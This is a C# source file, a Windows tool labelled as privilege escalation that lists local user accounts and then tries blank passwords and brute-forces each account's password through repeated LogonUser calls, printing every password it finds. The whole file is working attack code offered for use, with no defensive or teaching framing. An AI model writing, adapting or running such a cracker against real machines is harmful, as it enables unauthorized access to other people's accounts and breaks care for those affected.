using System;
using System.Collections.Generic;
using System.Text;
using System.Management;
using System.Management.Instrumentation;
using System.Runtime.InteropServices;
using System.IO;
using System.Diagnostics;
using System.Collections;

namespace GetUserNames
{

    //Trace.WriteLine(dirs[i]);
    //Debug.WriteLine(dirs[i]);

    class PrivilegieScalation {

        [System.Runtime.InteropServices.DllImport("advapi32.dll", SetLastError = true)]
        private static extern int LogonUser(string lpszUserName, string lpszDomain, string lpszPassword, int dwLogonType, int dwLogonProvider, ref IntPtr phToken);

        [System.Runtime.InteropServices.DllImport("advapi32.dll", CharSet = System.Runtime.InteropServices.CharSet.Auto, SetLastError = true)]
        private static extern int DuplicateToken(IntPtr hToken, int impersonationLevel, ref IntPtr hNewToken);

        [System.Runtime.InteropServices.DllImport("advapi32.dll", CharSet = System.Runtime.InteropServices.CharSet.Auto, SetLastError = true)]
        private static extern bool RevertToSelf();

        [System.Runtime.InteropServices.DllImport("kernel32.dll", CharSet = System.Runtime.InteropServices.CharSet.Auto)]
        private static extern bool CloseHandle(IntPtr handle);

        private const int LOGON32_LOGON_INTERACTIVE = 2;
        private const int LOGON32_PROVIDER_DEFAULT = 0;

        [DllImport("shell32.dll")]
        private static extern bool IsUserAnAdmin();

        private static ArrayList AuthenticatedEnumerateUsers() 
        {
            ArrayList list = new ArrayList();
            try {
                string[] systemDirs = new string[]{
                    "All Users", "Default", "Default User", "Desktop", "Public", "Invitado", "Guest"
                };

                ManagementObjectSearcher usersSearcher = new ManagementObjectSearcher(@"SELECT * FROM Win32_UserAccount");
                ManagementObjectCollection users = usersSearcher.Get();
                foreach (ManagementObject user in users)
                {
                    if (user["Status"].ToString().Equals("OK")) {
                        string name = user["Name"].ToString();
                        bool found = false;
                        for (int i = 0; i < systemDirs.Length; i++) {
                            if (systemDirs[i].Equals(name)) {
                                found = true;
                                break;
                            }
                        }
                        if (!found) list.Add(name);
                    }
                }
            }
            catch (Exception e) { }
            return list;
        }

        private static ArrayList GuestEnumerateUsers() 
        {
            ArrayList list = new ArrayList();

            try {
                string path = Environment.GetEnvironmentVariable("userprofile");
                path = Directory.GetParent(path).FullName;
                string[] dirs = Directory.GetDirectories(path);

                string[] systemDirs = new string[]{
                    "All Users", "Default", "Default User", "Desktop", "Public", "Invitado", "Guest"
                };

                for (int i = 0; i < dirs.Length; i++) {
                    string name = Path.GetFileName(Path.GetDirectoryName(dirs[i] + "\\"));
                    bool found = false;
                    for (int j = 0; j < systemDirs.Length; j++) {
                        if (name.Equals(systemDirs[j])) {
                            found = true;
                            break;
                        }
                    }
                    if (!found) list.Add(name);
                }
            } catch (Exception e) { }
            return list;
        }

        private static string[] EnumerateUsers() {
            ArrayList list = new ArrayList();
            if (IsAuthenticated()) list = AuthenticatedEnumerateUsers();
            else list = GuestEnumerateUsers();

            string[] users = null;
            if (list != null && list.Count > 0) { 
                users = new string[list.Count];
                list.CopyTo(users);
            }

            return users;
        }

        private static bool IsAuthenticated() 
        {
            return System.Security.Principal.WindowsIdentity.GetCurrent().IsAuthenticated;
        }

        private static bool IsAnonymous() 
        {
            try
            {
                return System.Security.Principal.WindowsIdentity.GetCurrent().IsAnonymous;
            }
            catch (Exception e) { }
            return false;
        }

        private static bool IsSystem() 
        {
            try
            {
                return System.Security.Principal.WindowsIdentity.GetCurrent().IsSystem;
            }
            catch (Exception e) { }
            return false;
        }

        private static bool IsGuest() 
        {
            return System.Security.Principal.WindowsIdentity.GetCurrent().IsGuest;
        }

        private static System.Security.Principal.WindowsImpersonationContext getImpersonate(string domain, string userName, string password)
        {
            if (userName == null || userName.Length == 0) return null;
            if (domain == null || domain.Length == 0) domain = System.Environment.MachineName;

            System.Security.Principal.WindowsImpersonationContext impersonationContext = null;
            System.Security.Principal.WindowsIdentity tempWindowsIdentity = null;
            IntPtr tokenDuplicate = IntPtr.Zero;
            IntPtr token = IntPtr.Zero;
            bool rsp = false;

            domain = domain.ToUpper();

            try {
                if (RevertToSelf()) {
                    if (LogonUser(userName, domain, password, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, ref token) != 0) {
                        if (DuplicateToken(token, 2, ref tokenDuplicate) != 0) {
                            tempWindowsIdentity = new System.Security.Principal.WindowsIdentity(tokenDuplicate);
                            impersonationContext = tempWindowsIdentity.Impersonate();
                            rsp = true;
                        }
                        else throw new System.ComponentModel.Win32Exception(System.Runtime.InteropServices.Marshal.GetLastWin32Error());
                    }
                    else throw new System.ComponentModel.Win32Exception(System.Runtime.InteropServices.Marshal.GetLastWin32Error());
                }
                else throw new System.ComponentModel.Win32Exception(System.Runtime.InteropServices.Marshal.GetLastWin32Error());
            }
            catch (Exception e) {}
            finally {
                if (token != IntPtr.Zero) CloseHandle(token);
                if (tokenDuplicate != IntPtr.Zero) CloseHandle(tokenDuplicate);
            }
            if (rsp && impersonationContext != null) return impersonationContext;
            return null;
        }

        private static System.Collections.Hashtable getNTPasswords(string machine, string[] users, int max)
        {
            try {
                if (max < 1) max = 1;
                if (users == null || users.Length == 0) return new System.Collections.Hashtable(0);
                if (machine == null || machine.Length == 0) machine = System.Environment.MachineName;

                //machine = machine.ToUpper();
                /*bool isLocalDomain = false;
                string localUser = string.Empty;
                if (machine.Equals(System.Environment.MachineName.ToUpper())){
                    isLocalDomain = true;
                    localUser = System.Environment.UserName.ToUpper();
                }*/

                System.Collections.Hashtable table = new System.Collections.Hashtable(0);
                for (int i = 0; i < users.Length; i++) {
                    //if (isLocalDomain && i < users.Length + 1 && localUser.Equals(users[i].ToUpper())) i++;
                    bool continueCheck = true;
                    System.Security.Principal.WindowsImpersonationContext wic = getImpersonate(machine, users[i], null);
                    if (wic != null) {
                        wic.Undo();
                        wic.Dispose();
                        wic = null;
                        table.Add(users[i], null);
                        continueCheck = false;
                    }
                    if (continueCheck) {
                        wic = getImpersonate(machine, users[i], "");
                        if (wic != null)
                        {
                            wic.Undo();
                            wic.Dispose();
                            wic = null;
                            table.Add(users[i], "");
                            continueCheck = false;
                        }
                    }
                    if (continueCheck) {
                        string pass = string.Empty;
                        bool found = false;
                        initCrackNTPassword(max, machine, users[i], ref pass, ref found);
                        if (found) table.Add(users[i], pass);
                        pass = string.Empty;
                        found = false;
                        continueCheck = false;
                    }
                }
                if (table.Count > 0) return table;
            } catch (Exception e) {
                string msg = e.Message;
            }
            return new System.Collections.Hashtable(0);
        }

        private static void initCrackNTPassword(int max, string domain, string user, ref string pass, ref bool found)
        {
            if (max <= 0) max = 1;
            for (int c = 1; c < max + 1; c++)
            {
                char[] data = new char[c];
                loopCrackNTPassword(ref data, 0, domain, user, ref pass, ref found);
                if (found) return;
            }
        }

        private static void loopCrackNTPassword(ref char[] buffer, int level, string domain, string user, ref string pass, ref bool found)
        {
            int nextLevel = level + 1;
            char[] charSet = "abcdefghijklmnñopqrstuvwxyzABCDEFGHIJKLMNÑOPQRSTUVWXYZ0123456789".ToCharArray();
            for (int c = 0; c < charSet.Length; c++)
            {
                buffer[level] = charSet[c];
                if (nextLevel == buffer.Length)
                {
                    string strBuffer = new string(buffer);
                    //Console.WriteLine("Trying password: " + strBuffer);
                    System.Security.Principal.WindowsImpersonationContext wic = getImpersonate(domain, user, strBuffer);
                    if (wic != null)
                    {
                        wic.Undo();
                        wic.Dispose();
                        wic = null;
                        found = true;
                        pass = new string(buffer);
                        return;
                    }
                }
                else
                {
                    if (!found) loopCrackNTPassword(ref buffer, nextLevel, domain, user, ref pass, ref found);
                    else return;
                }
            }
        }
        
        static void Main(string[] args) {
            if(IsAuthenticated()) Console.WriteLine("IsAuthenticated: TRUE");
            if(IsUserAnAdmin()) Console.WriteLine("IsUserAnAdmin: TRUE");
            if(IsAnonymous()) Console.WriteLine("IsAnonymous: TRUE");
            if(IsSystem()) Console.WriteLine("IsSystem: TRUE");
            if(IsGuest()) Console.WriteLine("IsGuest: TRUE");

            Console.WriteLine("\nEnumerateUsers:\n");
            string[] users = EnumerateUsers();
            if (users != null && users.Length > 0) {
                for (int i = 0; i < users.Length; i++) Console.WriteLine(users[i]);

                Console.WriteLine("\nStart Crack Passwords, This will take a long time:\n");

                for (int i = 0; i < users.Length; i++) {
                    System.Collections.Hashtable table = getNTPasswords(null, new string[] { users[i] }, 30);
                    //System.Collections.Hashtable table = new System.Collections.Hashtable(0);
                    if (table != null && table.Count > 0) {
                        foreach (DictionaryEntry pair in table){
                            Console.WriteLine("The user " + pair.Key + " has this password: " + pair.Value);
                        }
                    }
                    else Console.WriteLine("The user " + users[i] + " not has password");
                }               
            }

            Console.WriteLine("\nPress any key");
            Console.ReadKey();
        }
    }
}
